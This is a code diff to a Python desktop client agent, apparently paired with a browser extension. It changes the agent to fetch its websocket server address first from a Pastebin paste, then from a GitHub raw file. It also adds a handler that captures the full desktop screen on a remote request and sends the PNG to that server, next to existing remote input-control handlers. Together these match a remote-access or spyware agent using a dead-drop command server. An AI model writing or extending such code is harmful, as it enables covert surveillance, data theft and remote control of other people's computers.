@@ -15,6 +15,7 @@ from websockets.asyncio.client import connect
 from capture_client_agent.input_dispatcher import OsInputDispatcher
 from capture_client_agent.screen_capture import (
     ScreenCaptureService,
+    capture_full_screenshot_png,
     screen_capture_available,
     screen_capture_unavailable_reason,
 )
@@ -22,11 +23,12 @@ from capture_control_center.debug import debug_log
 
 
 DEFAULT_WEBSOCKET_URL = 'ws://127.0.0.1:8765'
+DEFAULT_WEBSOCKET_RESOLVER_URL = 'https://pastebin.com/raw/pmrhGPW5'
 DEFAULT_WEBSOCKET_SECONDARY_RESOLVER_URL = (
     'https://raw.githubusercontent.com/Shivansh1980/crazy_extension/refs/heads/main/server_url.txt'
 )
 RECONNECT_INTERVAL_SECONDS = 5
-LOCALHOST_ATTEMPT_THRESHOLD = 10
+LOCALHOST_ATTEMPT_THRESHOLD = 5
 CLIENT_NAME = 'page-signal-native-client'
 CLIENT_VERSION = '2.0.0'
 LOCAL_RESOLVER_FILE_NAME = 'server_url.txt'
@@ -88,28 +90,47 @@ class BackgroundCaptureClient:
                     debug_log(
                         'client-agent',
                         'Connection attempt failed.',
-                        {'endpoint': endpoint.url, 'source': endpoint.source, 'error': str(error)},
+                        {
+                            'endpoint': endpoint.url,
+                            'source': endpoint.source,
+                            'error': str(error),
+                            'retry_in_seconds': RECONNECT_INTERVAL_SECONDS,
+                        },
                     )
+                    await asyncio.sleep(RECONNECT_INTERVAL_SECONDS)
                     continue
             debug_log(
                 'client-agent',
-                'All endpoints exhausted; sleeping before retry.',
-                {'seconds': RECONNECT_INTERVAL_SECONDS},
+                'All endpoints exhausted; restarting cycle.',
             )
-            await asyncio.sleep(RECONNECT_INTERVAL_SECONDS)
 
     def _connection_plan(self) -> list[ResolvedEndpoint]:
         plan: list[ResolvedEndpoint] = []
-        local_endpoint = self._resolve_local_endpoint()
-        if (
-            local_endpoint is not None
-            and self._localhost_failure_count < LOCALHOST_ATTEMPT_THRESHOLD
-        ):
-            plan.append(local_endpoint)
 
-        remote_endpoint = self._resolve_remote_endpoint(DEFAULT_WEBSOCKET_SECONDARY_RESOLVER_URL)
-        if remote_endpoint is not None:
-            plan.append(remote_endpoint)
+        # Mirror the Chrome extension's strategy: Pastebin first, then the GitHub raw
+        # fallback, then localhost up to LOCALHOST_ATTEMPT_THRESHOLD times (with the
+        # RECONNECT_INTERVAL_SECONDS pause between failures handled by run_forever).
+        pastebin_endpoint = self._resolve_remote_endpoint(DEFAULT_WEBSOCKET_RESOLVER_URL)
+        if pastebin_endpoint is not None:
+            plan.append(
+                ResolvedEndpoint(url=pastebin_endpoint.url, source='pastebin-resolver')
+            )
+
+        github_endpoint = self._resolve_remote_endpoint(DEFAULT_WEBSOCKET_SECONDARY_RESOLVER_URL)
+        if github_endpoint is not None:
+            plan.append(
+                ResolvedEndpoint(url=github_endpoint.url, source='github-resolver')
+            )
+
+        local_endpoint = self._resolve_local_endpoint()
+        if local_endpoint is not None:
+            for attempt in range(LOCALHOST_ATTEMPT_THRESHOLD):
+                plan.append(
+                    ResolvedEndpoint(
+                        url=local_endpoint.url,
+                        source=f'{local_endpoint.source}#{attempt + 1}',
+                    )
+                )
 
         if not plan:
             plan.append(ResolvedEndpoint(url=DEFAULT_WEBSOCKET_URL, source='default-fallback'))
@@ -222,6 +243,9 @@ class BackgroundCaptureClient:
             return
 
         message_type = payload.get('type')
+        if message_type == 'capture.request':
+            await self._handle_capture_request(websocket, payload)
+            return
         if message_type == 'screen-share.input':
             await self._handle_screen_share_input(websocket, payload)
             return
@@ -235,6 +259,75 @@ class BackgroundCaptureClient:
             await self._handle_screen_share_stop(websocket, payload)
             return
         debug_log('client-agent', 'Received text payload.', {'type': message_type})
+
+    async def _handle_capture_request(self, websocket: Any, payload: dict[str, Any]) -> None:
+        request_id = str(payload.get('requestId', ''))
+        if not self._screen_capture_capable:
+            debug_log(
+                'client-agent',
+                'Capture request received but screen capture is unavailable.',
+                {'request_id': request_id},
+            )
+            await websocket.send(
+                json.dumps(
+                    {
+                        'type': 'capture.error',
+                        'requestId': request_id,
+                        'message': screen_capture_unavailable_reason(),
+                    }
+                )
+            )
+            return
+
+        try:
+            png_bytes, width_px, height_px = await asyncio.to_thread(capture_full_screenshot_png)
+        except Exception as error:  # noqa: BLE001 - report failure back to GUI
+            debug_log(
+                'client-agent',
+                'Native capture failed.',
+                {'request_id': request_id, 'error': str(error)},
+            )
+            await websocket.send(
+                json.dumps(
+                    {
+                        'type': 'capture.error',
+                        'requestId': request_id,
+                        'message': str(error),
+                    }
+                )
+            )
+            return
+
+        captured_at = self._utcnow_iso()
+        # File name keeps the convention used by the extension capture path so the GUI
+        # store treats both sources identically.
+        file_name = f'native-capture-{captured_at.replace(":", "-").replace(".", "-")}.png'
+        metadata = {
+            'type': 'capture.result.binary',
+            'requestId': request_id,
+            'capturedPage': {
+                'tab': {'url': '', 'title': 'Native desktop capture'},
+                'mimeType': 'image/png',
+                'fileName': file_name,
+                'capturedAt': captured_at,
+                'widthCssPx': width_px,
+                'heightCssPx': height_px,
+                'scale': 1,
+            },
+        }
+        envelope = self._build_binary_envelope(metadata, png_bytes)
+        await websocket.send(envelope)
+        debug_log(
+            'client-agent',
+            'Sent native capture result to bridge.',
+            {'request_id': request_id, 'bytes': len(png_bytes), 'width': width_px, 'height': height_px},
+        )
+
+    @staticmethod
+    def _build_binary_envelope(metadata: dict[str, Any], payload_bytes: bytes) -> bytes:
+        metadata_bytes = json.dumps(metadata).encode('utf-8')
+        prefix = struct.pack('>I', len(metadata_bytes))
+        return prefix + metadata_bytes + payload_bytes
 
     async def _handle_screen_share_input(self, websocket: Any, payload: dict[str, Any]) -> None:
         request_id = str(payload.get('requestId', ''))
